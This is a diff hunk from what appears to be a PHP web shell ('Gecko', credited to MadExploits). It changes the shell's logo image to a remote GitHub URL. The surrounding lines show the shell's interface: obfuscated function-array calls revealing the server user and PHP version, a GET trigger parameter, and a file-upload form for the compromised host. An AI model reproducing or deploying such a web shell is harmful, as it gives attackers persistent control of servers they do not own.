@@ -742,7 +742,7 @@ if ($_GET['don'] == true) {
             <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
             <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
             <li><i class="fa-brands fa-github"></i>&nbsp;www.github.com/MadExploits</li>
-            <li class="logo-gecko"><img width="400" height="200" src="rushercloud.png" align="right"></li>
+            <li class="logo-gecko"><img width="400" height="200" src="https://raw.githubusercontent.com/angelineuniverse/Cybersecurity/refs/heads/main/rushercloud.png" align="right"></li>
             <form action="" method="post" enctype='<?= "multipart/form-data"; ?>'>
                 <li class="form-upload">
                     <input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;
